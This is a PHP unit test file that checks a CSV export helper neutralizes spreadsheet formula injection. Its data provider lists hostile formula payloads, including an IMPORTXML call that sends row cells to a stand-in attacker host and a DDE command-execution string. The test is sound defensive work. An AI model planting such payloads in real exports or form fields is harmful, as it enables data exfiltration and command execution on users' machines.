<?php

declare(strict_types=1);

namespace App\Tests\Unit;

use App\Helpers\Csv;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * QA-5 RPT-02: a client/order name or free-text field (client self-service
 * forms, dispute/amendment reasons, comments) can carry attacker-chosen text
 * all the way into a report CSV export. Excel/Sheets/LibreOffice evaluate a
 * cell starting with =, +, -, @, or tab/CR as a formula on open, so a
 * client name like '=IMPORTXML("http://attacker/",...)' run through a staff
 * member's spreadsheet can exfiltrate other cells in that row. Csv::stream()
 * calls exit() on its success path, which would kill the PHPUnit process if
 * invoked directly, so this drives the neutralization logic itself via
 * reflection — same pattern as TestModeFrozenPrefixesTest.
 */
final class CsvFormulaInjectionTest extends TestCase
{
    /** @return array<int, array{0: string}> */
    public static function dangerousValuesProvider(): array
    {
        return [
            ['=IMPORTXML("http://attacker.example/",CONCATENATE(A1:Z1))'],
            ['=cmd|\'/c calc\'!A1'],
            ['+1+1'],
            ['-1+1'],
            ['@SUM(1+1)'],
            ["\t=1+1"],
            ["\r=1+1"],
        ];
    }

    #[DataProvider('dangerousValuesProvider')]
    public function testNeutralizesLeadingFormulaTriggerCharacters(string $value): void
    {
        $safe = self::neutralize($value);
        self::assertStringStartsWith("'", $safe, "\"{$value}\" must be neutralized with a leading quote");
        self::assertSame($value, substr($safe, 1));
    }

    /** @return array<int, array{0: string}> */
    public static function safeValuesProvider(): array
    {
        return [
            ['Ordinary Trading Co.'],
            ['Client -inline dash is fine mid-string'],
            [''],
            ['john@example.com'],
            ['A-1 Warehouse'],
        ];
    }

    #[DataProvider('safeValuesProvider')]
    public function testLeavesOrdinaryValuesUnchanged(string $value): void
    {
        self::assertSame($value, self::neutralize($value));
    }

    private static function neutralize(string $value): string
    {
        $reflection = new \ReflectionClass(Csv::class);
        $method = $reflection->getMethod('neutralizeFormula');
        $method->setAccessible(true);
        return (string) $method->invoke(null, $value);
    }
}
